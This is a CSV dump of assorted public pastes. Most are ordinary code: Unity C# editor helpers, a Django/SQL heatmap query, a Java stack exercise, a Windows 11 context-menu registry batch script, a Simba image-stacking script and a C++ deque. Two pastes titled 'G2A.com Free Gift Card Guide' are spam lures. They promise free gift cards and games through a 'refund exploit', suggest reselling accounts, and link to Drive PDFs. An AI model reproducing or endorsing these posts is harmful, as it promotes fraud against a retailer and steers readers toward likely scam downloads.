id,title,username,language,date,content
zUyGsBHn,Untitled,Ilya_Bykonya,C#,Thursday 14th of March 2024 01:01:04 PM CDT,"using System.Collections;
using System.Collections.Generic;
using UnityEditor;
using UnityEngine;

namespace Utils
{
    public class ReadOnlyAttribute : PropertyAttribute { }

    [CustomPropertyDrawer(typeof(ReadOnlyAttribute))]
    public class ReadOnlyDrawer : PropertyDrawer
    {
        public override float GetPropertyHeight(SerializedProperty property, GUIContent label)
        {
            return EditorGUI.GetPropertyHeight(property, label, true);
        }
        public override void OnGUI(Rect position, SerializedProperty property, GUIContent label)
        {
            GUI.enabled = false;
            EditorGUI.PropertyField(position, property, label, true);
            GUI.enabled = true;
        }
    }
}"
ArLgdGF5,Untitled,Ilya_Bykonya,C#,Thursday 14th of March 2024 12:57:39 PM CDT,"﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using UnityEngine.Events;
using UnityEngine;
using Utils;
using UnityEditor.UIElements;
using UnityEditor;
using UnityEngine.UIElements;
using UnityEditor.PackageManager.UI;
using UnityEditor.Rendering;
using UnityEditor.Experimental.GraphView;
using System.Reflection;

namespace Utils
{
    [Serializable]
    public class ActiveField<T>
    {
        [SerializeField] private T _value;
        public UnityEvent Changed;

        public T Value
        {
            get => _value;
            set
            {
                _value = value;
                Changed?.Invoke();
            }
        }

        public void SetValue(T value) => Value = value;
        public ActiveField(T value, UnityEvent changed)
        {
            Changed = changed;
            _value = value;
        }
    }


    
    [CustomPropertyDrawer(typeof(ActiveField<>))]
    public class ActiveFieldDrawer : PropertyDrawer
    {
        public override VisualElement CreatePropertyGUI(SerializedProperty property)
        {
            var serialized_changed_event_property = property.FindPropertyRelative(""Changed"");
            var changed_event = PropertyReflectionGetter.SerializedPropertyToObject<UnityEvent>(serialized_changed_event_property);

            var container = new VisualElement();
            var changed_event_field = new PropertyField(serialized_changed_event_property);
            var value_field = new PropertyField(property.FindPropertyRelative(""_value""));

            value_field.RegisterValueChangeCallback((_) => changed_event?.Invoke());
            container.Add(new Label($""ActiveEvent<>: [{property.displayName}]""));
            container.Add(value_field);
            container.Add(changed_event_field);
            return container;
        }
    }
    public static class PropertyReflectionGetter
    {
        public static T SerializedPropertyToObject<T>(SerializedProperty property)
        {
            return GetNestedObject<T>(property.propertyPath, GetSerializedPropertyRootComponent(property), true); //The ""true"" means we will also check all base classes
        }
        public static Component GetSerializedPropertyRootComponent(SerializedProperty property)
        {
            return (Component)property.serializedObject.targetObject;
        }
        public static T GetNestedObject<T>(string path, object obj, bool includeAllBases = false)
        {
            foreach (string part in path.Split('.'))
            {
                obj = GetFieldOrPropertyValue<object>(part, obj, includeAllBases);
            }
            return (T)obj;
        }
        public static T GetFieldOrPropertyValue<T>(string fieldName, object obj, bool includeAllBases = false, BindingFlags bindings = BindingFlags.Instance | BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic)
        {
            FieldInfo field = obj.GetType().GetField(fieldName, bindings);
            if (field != null) return (T)field.GetValue(obj);

            PropertyInfo property = obj.GetType().GetProperty(fieldName, bindings);
            if (property != null) return (T)property.GetValue(obj, null);

            if (includeAllBases)
            {
                foreach (Type type in GetBaseClassesAndInterfaces(obj.GetType()))
                {
                    field = type.GetField(fieldName, bindings);
                    if (field != null) return (T)field.GetValue(obj);

                    property = type.GetProperty(fieldName, bindings);
                    if (property != null) return (T)property.GetValue(obj, null);
                }
            }

            return default(T);
        }
        public static void SetFieldOrPropertyValue<T>(string fieldName, object obj, object value, bool includeAllBases = false, BindingFlags bindings = BindingFlags.Instance | BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic)
        {
            FieldInfo field = obj.GetType().GetField(fieldName, bindings);
            if (field != null)
            {
                field.SetValue(obj, value);
                return;
            }

            PropertyInfo property = obj.GetType().GetProperty(fieldName, bindings);
            if (property != null)
            {
                property.SetValue(obj, value, null);
                return;
            }

            if (includeAllBases)
            {
                foreach (Type type in GetBaseClassesAndInterfaces(obj.GetType()))
                {
                    field = type.GetField(fieldName, bindings);
                    if (field != null)
                    {
                        field.SetValue(obj, value);
                        return;
                    }

                    property = type.GetProperty(fieldName, bindings);
                    if (property != null)
                    {
                        property.SetValue(obj, value, null);
                        return;
                    }
                }
            }
        }
        public static IEnumerable<Type> GetBaseClassesAndInterfaces(this Type type, bool includeSelf = false)
        {
            List<Type> allTypes = new List<Type>();

            if (includeSelf) allTypes.Add(type);

            if (type.BaseType == typeof(object))
            {
                allTypes.AddRange(type.GetInterfaces());
            }
            else
            {
                allTypes.AddRange(
                        Enumerable
                        .Repeat(type.BaseType, 1)
                        .Concat(type.GetInterfaces())
                        .Concat(type.BaseType.GetBaseClassesAndInterfaces())
                        .Distinct());
                //I found this on stackoverflow
            }

            return allTypes;
        }
    }


    /*
    [CustomPropertyDrawer(typeof(ActiveField<float>))]
    public class ActiveFieldEditor : PropertyDrawer
    {
        public override float GetPropertyHeight(SerializedProperty property, GUIContent label)
        {
            return base.GetPropertyHeight(property, label) * 3;
        }
        public override void OnGUI(Rect position, SerializedProperty property, GUIContent label)
        {
            var freeRect = EditorGUI.PrefixLabel(position, new GUIContent($""He-he""));
            base.OnGUI(position, property, label);
            */
    /*
    using (var scope = new EditorGUI.PropertyScope(position, label, property))
    {
        var freeRect = EditorGUI.PrefixLabel(position, new GUIContent($""He-he""));
    }
    */
    /*
    var minLimit = property.FindPropertyRelative(""minLimit"");
    var maxLimit = property.FindPropertyRelative(""maxLimit"");
    var minValue = property.FindPropertyRelative(""minValue"");
    var maxValue = property.FindPropertyRelative(""maxValue"");
    using (var scope = new EditorGUI.PropertyScope(position, label, property))
    {
        var freeRect = EditorGUI.PrefixLabel(position, new GUIContent($""{minLimit.floatValue}|{maxLimit.floatValue}""));
        var lineSize = freeRect.height / 3;

        EditorGUI.BeginChangeCheck();
        var minValueFloat = minValue.floatValue;
        var maxValueFloat = maxValue.floatValue;
        var sliderRect = new Rect(freeRect.x, freeRect.y, freeRect.width, lineSize);
        EditorGUI.MinMaxSlider(sliderRect, ref minValueFloat, ref maxValueFloat, minLimit.floatValue, maxLimit.floatValue);

        var minLimitRect = new Rect(freeRect.x, freeRect.y + 1 * lineSize, freeRect.width, lineSize);
        var maxLimitRect = new Rect(freeRect.x, freeRect.y + 2 * lineSize, freeRect.width, lineSize);
        var minLimitFloat = EditorGUI.FloatField(new Rect(minLimitRect), ""Min limit"", minLimit.floatValue);
        var maxLimitFloat = EditorGUI.FloatField(new Rect(maxLimitRect), ""Max limit"", maxLimit.floatValue);

        if (EditorGUI.EndChangeCheck())
        {
            minLimit.floatValue = minLimitFloat;
            maxLimit.floatValue = maxLimitFloat;
            minValue.floatValue = minValueFloat;
            maxValue.floatValue = maxValueFloat;
        }
    }
    */
    /*}
        }*/
    //    [CustomEditor(typeof(ActiveField<>))]
    //    class GenericActiveFieldEditor : Editor
    //    {
    //        public override void OnInspectorGUI()
    //        {
    //            EditorGUILayout.LabelField(""I'm shown OK generic"");
    //        }
    //    }
    //    [CustomEditor(typeof(ActiveField<float>))]
    //    class FloatActiveFieldEditor: Editor
    //    {
    //        public override void OnInspectorGUI()
    //        {
    //            EditorGUILayout.LabelField(""I'm shown OK float"");
    //        }
    //    }
}"
uc5ZjHnP,G2A.com Free Gift Card Guide Mar 2024 NEW,luckysw,GetText,Thursday 14th of March 2024 12:35:57 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
IMPORTANT: If you use this make sure to use the English version of G2A.com otherwise this will not work!
 
You can buy gift cards directly with it or you can buy popular games then put them on fresh steam accounts and then sell those accounts.
 
PDF guide here:
https://drive.google.com/file/d/1aOBwxx73UL1B5zML5LsDdQ4k3YafTnrc/view?usp=sharing
 
 
Working as of:
14 March 2024
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 "
E9d6NGiD,delivery heatmap randomize,soyuzbek,Python,Thursday 14th of March 2024 12:13:33 PM CDT,"    delivery_points = models.Order.all_objects.filter(
        delivery_point__latitude__isnull=False,
        delivery_point__longitude__isnull=False,
        *default_filter_args,
        **filter_params,
    ).select_related('delivery_point').annotate(
        rounded_latitude=RawSQL('round(""order__delivery_point"".""latitude"", 2)'),
        rounded_longitude=RawSQL('round(""order__delivery_point"".""longitude"", 2)'),
        count=Count('delivery_point__latitude'),
    ).group_by('rounded_latitude', 'rounded_longitude').values(
        'rounded_latitude',
        'rounded_longitude',
        'count',
    )
    
    query = f""""""
            SELECT
             count(""delivery_points"".""count"") as ""count"",
             ""delivery_points"".""rounded_latitude"" as ""latitude"",
             ""delivery_points"".""rounded_longitude"" as ""longitude""
            FROM ({delivery_points.as_query()}) AS ""delivery_points""
            GROUP BY
              ""delivery_points"".""rounded_latitude"",
              ""delivery_points"".""rounded_longitude""
         """"""
    # noinspection PyUnusedLocal
    result_list = []
    async with database_connection() as conn:
        data = await conn.fetch(query)
        result_list = parse_obj_as(List[HeatmapResponseItem], data)
    
    
    

    # noinspection PyMethodParameters
    @pydantic.validator('latitude', 'longitude')
    def randomize_geodata(cls, value):
        return round(uniform(value - 0.005, value + 0.005), 5)"
1hFq4BJ5,stack,mantha_raghava,Java,Thursday 14th of March 2024 12:08:49 PM CDT,"import java.util.Scanner;

public class Solution {
    
    public static void main(String[] args) {
        
        Scanner scanner = new Scanner(System.in);
        int t = scanner.nextInt();
        scanner.nextLine(); 

        String[] stack = new String[10000];
        int top = -1;
        for (int i = 0; i < t; i++) {
            String[] input = scanner.nextLine().split("" "");
            if (input[0].equals(""push"")) {
                stack[++top] = input[1];
            } else if (input[0].equals(""pop"")) {
                if (top == -1) {
                    System.out.println(""Empty"");
                }
                else{
                    System.out.println(stack[top]);
                    top--;
                }
            }
        }
        
    }
}
"
X2aFKUCP,Windows11_Kontextmenue,Takiry,Batch,Thursday 14th of March 2024 12:06:38 PM CDT,"@echo off
set /p sid=SID des Nutzers:
echo.

echo Wie soll das Kontextmenue aussehen?
echo 1 = Wie bei Windows 10
echo 2 = Wie bei Windows 11
echo.
set /p ausw=Auswahl:

if %ausw% EQU 1 (
reg.exe add ""HKEY_USERS\%sid%_Classes\CLSID\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}\InprocServer32"" /f /ve
goto restart
)

if %ausw% EQU 2 (
reg.exe delete ""HKEY_USERS\%sid%_Classes\CLSID\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}\InprocServer32"" /f /ve
goto restart
)
else (
exit
)

:restart
shutdown.exe -r -f -t 1"
CvQ3sWvU,G2A.com Free Gift Card Guide Mar 2024,ounnuo,GetText,Thursday 14th of March 2024 11:56:13 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

If you use this make sure to use the English version of G2A.com otherwise this will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_730191.pdf

Working as of:
14 March 2024





















"
auNRUH31,Pastes.io - #1 Pastebin Alternative,xxsa,PHP,Thursday 14th of March 2024 11:52:18 AM CDT,"https://pastes.io - Paste Tool - Pastebin Alternative - Free

Pastes.io is a simple and efficient pastebin for mainly code to be distributed neatly and efficiently across the web. Website where you can paste and store any type of text or code snippets online and share it with your friends, Also You can see Recent Pastes

150+ different syntax languages - All Free
Paste Folders
Load files feature
Password protected pastes
Encrypted pastes
URL Shortener
Unlisted pastes
Private pastes
Paste expiration system
Self destroy pastes
Embed, download, print pastes
Socialite (Facebook/Twitter/Google Social login)
Trending pastes page (day, week, month, year)
Password protected pastes
Encrypted pastes
URL Shortener
Unlisted pastes
Private pastes
Paste expiration system
Self destroy pastes
Share pastes on social network
Facebook/Disqus/Custom comment system
Invisible/Custom captcha protection
Trending pastes page (day, week, month, year)
No Captcha for logged in users feature
Simple Ads by Google Adsense Few rather than Pastebin"
tb3sLyee,Simba - Align & Stack,WarPie90,Delphi,Thursday 14th of March 2024 11:49:13 AM CDT,"program new;
{$I SRL/osr.simba}
{$R-}

type
  TMufImage  = TMufasaBitmap;
  TMufImages = array of TMufImage;

function StackMedian(lst: TMufImages): TMufImage;
var
  x,y,i: Int32;
  R,G,B: TIntegerArray;
  color: TRGB32;
begin
  result.Init();
  result.SetSize(lst[0].GetWidth(), lst[0].GetHeight());
  SetLength(R, Length(lst));
  SetLength(G, Length(lst));
  SetLength(B, Length(lst));

  for y:=0 to result.GetHeight()-1 do
    for x:=0 to result.GetWidth()-1 do
    begin
      for i:=0 to High(lst) do
      begin
        color := TRGB32(lst[i].GetPixel(x,y));
        R[i] := color.R;
        G[i] := color.G;
        B[i] := color.B;
      end;
      color.R := R.Sorted()[length(R) div 2];
      color.G := G.Sorted()[length(R) div 2];
      color.B := B.Sorted()[length(R) div 2];

      result.SetPixel(x,y, TColor(color));
    end;
end;

procedure TMufImage.EnhanceColor(f: Single);
var
  x,y: Int32;
  H,S,L: Extended;
begin
  for y:=0 to self.GetHeight()-1 do
    for x:=0 to self.GetWidth()-1 do
    begin
      ColorToHSL(self.GetPixel(x,y),H,S,L);
      Self.SetPixel(x,y, HSLToColor(H,Min(100,Max(0,S*f)),L));
    end;
end;

procedure TMufImage.LightContrast(f: Single);
var
  x,y: Int32;
  H,S,L: Extended;
begin
  for y:=0 to self.GetHeight()-1 do
    for x:=0 to self.GetWidth()-1 do
    begin
      ColorToHSL(self.GetPixel(x,y),H,S,L);
      Self.SetPixel(x,y, HSLToColor(H,S,Min(100,Max(0,L*f))));
    end;
end;

procedure TMufImage.AdjustPop(f: Single; MidPt: Single=0.5);
var
  x,y: Int32;
  H,S,L: Extended;
  newS, newL: Extended;
begin
  for y:=0 to self.GetHeight()-1 do
    for x:=0 to self.GetWidth()-1 do
    begin
      ColorToHSL(self.GetPixel(x,y),H,S,L);

      newS := Min(100,Max(0,(MidPt+(S/100-MidPt)*f)*100));
      newL := (Min(100,Max(0,(MidPt+(L/100-MidPt)*f)*100)) + L) / 2;

      Self.SetPixel(x,y, HSLToColor(H, newS, newL));
    end;
end;

function StackMean(lst: TMufImages): TMufImage;
var
  x,y,i: Int32;
  R,G,B: Int32;
  color: TRGB32;

begin
  result.Init();
  result.SetSize(lst[0].GetWidth(), lst[0].GetHeight());

  for y:=0 to result.GetHeight()-1 do
    for x:=0 to result.GetWidth()-1 do
    begin
      r := 0;
      g := 0;
      b := 0;
      for i:=0 to High(lst) do
      begin
        color := TRGB32(lst[i].GetPixel(x,y));
        R += color.R;
        G += color.G;
        B += color.B;
      end;
      R /= Length(lst);
      G /= Length(lst);
      B /= Length(lst);
      color := [B,G,R];
      result.SetPixel(x,y, TColor(color));
    end;
end;

procedure TMufasaBitmap.Offset(ax,ay: Int32);
var w,h,x,y: Int32;
begin
  w := Self.getWidth()-1;
  h := Self.getHeight()-1;

  for y:=h downto 0 do
    for x:=w downto 0 do //boundchecking internaly in simba
      self.SetPixel(x+ax,y+ay, self.GetPixel(x,y));
end;

procedure Alignment(base:TMufImage; lst: TMufImages; Area:Int32=150);
  function VerifyIntegrity(patch: TMufImage): Boolean;
  var x,y: Int32;
  begin
    Result := patch.PeakBrightness() > 20;
  end;
var
  locations: TPointArray;
  patch,tmp: TMufImage;
  i,x,y,w,h: Int32;
  p: TPoint;
begin
  w := base.getWidth()-1;
  h := base.getHeight()-1;
  for patch in lst do
  begin
    locations := [];
    for y:=0 to h with area do
      for x:=0 to w with area do
      begin
        tmp := patch.Copy(x,y, Min(x+area, w), Min(y+area, h));
        if VerifyIntegrity(tmp) then
          locations += base.MatchTemplate(tmp, TM_CCOEFF_NORMED).ArgMax() + Point(-x,-y);

        tmp.Free();
      end;

    p := locations.Median();
    WriteLn('Offsetting by: ', p);
    patch.Offset(p.x, p.y);
  end;
end;



var
  patch,res,bmp: TMufImage;
  i: Int32;
  tmp,idx: string;
  TSA: TStringArray;
  mat: TSingleMatrix;
  at,rel: TPoint;

  lst: TMufImages;
begin
  bmp.Init();
  bmp.LoadFromFile('C:\Users\Eier\Desktop\Ny mappe (4)\crop\a_0000_392A0001.CR2.png');

  TSA := GetFiles('C:\Users\Eier\Desktop\Ny mappe (4)\crop\','png');

  WriteLn('Loading images...');
  for tmp in TSA do
  begin
    patch.Init();
    patch.LoadFromFile('C:\Users\Eier\Desktop\Ny mappe (4)\crop\'+tmp);

    lst += patch;
    WriteLn(tmp);
  end;

  WriteLn('Applying alignment...');
  Alignment(bmp, lst);

  WriteLn('Stacking...');
  res := StackMean(lst);

  res.EnhanceColor(1.8);
  res.AdjustPop(1.6);
  res.LightContrast(1.3);
  res.Debug();

  res.SaveToFile('autostack.png');
  res.Free();
end."
t8xzdZms,Untitled,a_rasskazkin,C++,Thursday 14th of March 2024 11:46:43 AM CDT,"#include <iostream>

//class T {};

template <class T>
class Deque {
 public:
  Deque() = default;
  Deque(int new_size, const T& value) {
    for (int i = 0; i < new_size; ++i) {
      try {
        push_back(value);
      } catch (...) {
        for (i--; i >= 0; --i) {
          pop_back();
        }
        throw;
      }
    }
  }
  explicit Deque(int new_size) : Deque(new_size, T()) {}
  Deque(const Deque& other) {
    for (size_t i = 0; i < other.size(); ++i) {
      push_back(other[i]);
    }
  }

  void push_back(const T& value) {
    if (right_index_ == 0) {
      data_.PushBack(GetNewRow());
    }
    try {
      new(data_.Back() + right_index_) T(value);
    } catch(...) {
      if (right_index_ == 0) {
        data_.PopBack();
      }
      throw;
    }
    right_index_ = (right_index_ + 1) % kBlockSize_;
    ++size_;
  }
  void push_front(const T& value) {
    --left_index_;
    if (left_index_ == -1) {
      data_.PushFront(GetNewRow());
      left_index_ += kBlockSize_;
    }
    try {
      new(data_.Front() + left_index_) T(value);
    } catch (...) {
      ++left_index_;
      if (left_index_ == kBlockSize_) {
        data_.PopFront();
        left_index_ = 0;
      }
      throw;
    }
    ++size_;
  }

  void pop_back() {
    right_index_ = (right_index_ + kBlockSize_ - 1) % kBlockSize_;
    data_.Back()[right_index_].~T();
    if (right_index_ == 0) {
      data_.PopBack();
    }
    --size_;
  }
  void pop_front() {
    data_.Front()[left_index_].~T();
    ++left_index_;
    if (left_index_ == kBlockSize_) {
      data_.PopFront();
      left_index_ = 0;
    }
    --size_;
  }

  [[nodiscard]] size_t size() const {
    return size_;
  }

  T& operator[] (size_t index) {
    return *(begin() + index);
  }
  const T& operator[] (size_t index) const {
    return *(begin() + index);
  }
  T& at(size_t index) {
    if (index >= size_) {
      throw std::out_of_range(""Index out of range"");
    }
    return operator[](index);
  }
  const T& at(size_t index) const {
    if (index >= size_) {
      throw std::out_of_range(""Index out of range"");
    }
    return operator[](index);
  }

 private:

  class InsideDeque {
   public:
    T* operator[] (int index) {
      return data_[index];
    }

    const T* operator[] (int index) const {
      return data_[index];
    }

    void PushBack(T* value) {
      if (right_index_ == capacity_) {
        IncreaseCapacity(false);
      }

      data_[right_index_] = value;
      ++right_index_;
    }

    void PushFront(T* value) {
      if (left_index_ == 0) {
        IncreaseCapacity(true);
      }

      --left_index_;
      data_[left_index_] = value;
    }

    void PopFront() {
      delete[] reinterpret_cast<char*>(data_[left_index_]);
      ++left_index_;
    }

    void PopBack() {
      --right_index_;
      delete[] reinterpret_cast<char*>(data_[right_index_]);
    }

    [[nodiscard]] T*Front() const {
      return data_[left_index_];
    }

    [[nodiscard]] T* Back() const {
      return data_[right_index_ - 1];
    }

    const T** GetConstData() const {
      return const_cast<const T**>(data_);
    }

    void IncreaseCapacity(bool is_back) {
      int new_capacity = capacity_ * 2 + 1;
      T** new_data_ = new T*[new_capacity];
      int shift_ = is_back * (new_capacity - capacity_);

      for (int i = left_index_; i < right_index_; ++i) {
        new_data_[i + shift_] = data_[i];
      }
      left_index_ += shift_;
      right_index_ += shift_;
      capacity_ = new_capacity;

      delete[] data_;
      data_ = new_data_;
    }

    ~InsideDeque() {
      for (int i = left_index_; i < right_index_; ++i) {
        delete[] reinterpret_cast<char*>(data_[i]);
      }
      delete[] data_;
    }

    T** data_ = nullptr;

    int left_index_ = 0;
    int right_index_ = 0;
    int capacity_ = 0;
  };

  template <bool is_const>
  class iteratorPrototype {
    using Type = std::conditional_t<is_const, const T, T>;

    iteratorPrototype(Type** data, int first, int second) : data_(data), first_ind(first), second_ind(second) {}

    friend Deque;
   public:

    using iterator_concept = std::random_access_iterator_tag;
    using iterator_category = std::random_access_iterator_tag;
    using value_type = std::conditional_t<is_const, const T, T>;
    using difference_type = std::ptrdiff_t;
    using pointer = std::conditional_t<is_const, const T*, T*>;
    using reference = std::conditional_t<is_const, const T&, T&>;

    Type** data_;
    int first_ind;
    int second_ind;
    iteratorPrototype& operator+= (int value) {
      second_ind += value;
      int new_second = (second_ind % kBlockSize_ + kBlockSize_) % kBlockSize_;
      first_ind += (second_ind - new_second) / kBlockSize_;
      second_ind = new_second;
      return *this;
    }
    iteratorPrototype& operator-= (int value) {
      second_ind -= value;
      int new_second = (second_ind % kBlockSize_ + kBlockSize_) % kBlockSize_;
      first_ind -= (new_second - second_ind) / kBlockSize_;
      second_ind = new_second;
      return *this;
    }
    iteratorPrototype& operator++ () {
      return operator+=(1);
    }
    iteratorPrototype& operator-- () {
      return operator-=(1);
    }
    iteratorPrototype<is_const> operator++ (int) {
      iteratorPrototype result = *this;
      operator++();
      return result;
    }
    iteratorPrototype<is_const> operator-- (int) {
      iteratorPrototype result = *this;
      operator--();
      return result;
    }
    iteratorPrototype operator+ (int value) const {
      iteratorPrototype result = *this;
      result += value;
      return result;
    }
    iteratorPrototype operator- (int value) const {
      iteratorPrototype result = *this;
      result -= value;
      return result;
    }

    template <bool another_const>
    iteratorPrototype operator= (const iteratorPrototype<another_const>& index) {
      first_ind = index.first_ind;
      second_ind = index.second_ind;
      if constexpr (is_const && !another_const) {
        data_ = const_cast<Type**>(index.data_);
      } else if constexpr (!is_const && another_const) {
        throw std::logic_error(""Can't assign const iteratorPrototype to non-const iteratorPrototype"");
      } else {
        data_ = index.data_;
      }
      return *this;
    }
    template<bool another_const>
    bool operator== (const iteratorPrototype<another_const>& index) const {
      return first_ind == index.first_ind && second_ind == index.second_ind;
    }
    template<bool another_const>
    bool operator!= (const iteratorPrototype<another_const>& index) const {
      return !(*this == index);
    }
    template<bool another_const>
    bool operator< (const iteratorPrototype<another_const>& index) const {
      return first_ind < index.first_ind || (first_ind == index.first_ind && second_ind < index.second_ind);
    }
    template<bool another_const>
    bool operator> (const iteratorPrototype<another_const>& index) const {
      return index < *this;
    }
    template<bool another_const>
    bool operator<= (const iteratorPrototype<another_const>& index) const {
      return !(*this > index);
    }
    template<bool another_const>
    bool operator>= (const iteratorPrototype<another_const>& index) const {
      return !(*this < index);
    }

    Type* operator-> () {
      return &data_[first_ind][second_ind];
    }
    Type& operator* () {
      return data_[first_ind][second_ind];
    }

    std::ptrdiff_t operator- (const iteratorPrototype& index) {
      return (first_ind - index.first_ind) * kBlockSize_ + (second_ind - index.second_ind);
    }

    operator iteratorPrototype<true>() const {
      return iteratorPrototype<true>(data_, first_ind, second_ind);
    }
  };

 public:

  using const_iterator = iteratorPrototype<true>;
  using iterator = iteratorPrototype<false>;

  iterator begin() {
    return iterator(data_.data_, data_.left_index_, left_index_);
  }
  iterator end() {
    return iterator(data_.data_, data_.right_index_ - (right_index_ != 0 ? 1 : 0), right_index_);
  }
  const_iterator begin() const {
    return cbegin();
  }
  const_iterator end() const {
    return cend();
  }
  const_iterator cbegin() const {
    return const_iterator(data_.GetConstData(), data_.left_index_, left_index_);
  }
  const_iterator cend() const {
    return const_iterator(data_.GetConstData(), data_.right_index_ - (right_index_ != 0 ? 1 : 0), right_index_);
  }

  std::reverse_iterator<iterator> rbegin() {
    return std::reverse_iterator<iterator>(end());
  }
  std::reverse_iterator<iterator> rend() {
    return std::reverse_iterator<iterator>(begin());
  }
  std::reverse_iterator<const_iterator> rbegin() const {
    return std::reverse_iterator<const_iterator>(cend());
  }
  std::reverse_iterator<const_iterator> rend() const {
    return std::reverse_iterator<const_iterator>(cbegin());
  }
  std::reverse_iterator<const_iterator> crbegin() const {
    return std::reverse_iterator<const_iterator>(cend());
  }
  std::reverse_iterator<const_iterator> crend() const {
    return std::reverse_iterator<const_iterator>(cbegin());
  }

  template<bool another_const>
  void insert(const iteratorPrototype<another_const>& it, const T& value) {
    push_back(value);
    for (auto nit = end() - 1; nit != it; --nit) {
      std::swap(*nit, *(nit - 1));
    }
  }
  template<bool another_const>
  void erase(const iteratorPrototype<another_const>& it) {
    for (auto nit = it; nit <= end() - 2; ++nit) {
      std::swap(*nit, *(nit + 1));
    }
    pop_back();
  }

  T* GetNewRow() {
    T* new_row = reinterpret_cast<T*>(new char[kBlockSize_ * sizeof(T)]);
    return new_row;
  }

  ~Deque() {
    for (size_t i = 0; i < size_; ++i) {
      operator[](i).~T();
    }
  }

  Deque& operator= (const Deque& other) {
    for (size_t i = 0; i < other.size_; ++i) {
      if (i == size_) {
        push_back(other[i]);
      } else {
        operator[](i) = other[i];
      }
    }
    while (size_ > other.size_) {
      pop_back();
    }
    return *this;
  }

  static constexpr int kBlockSize_ = 2;
  int left_index_ = 0;
  int right_index_ = 0;
  size_t size_ = 0;
  InsideDeque data_;
};
"
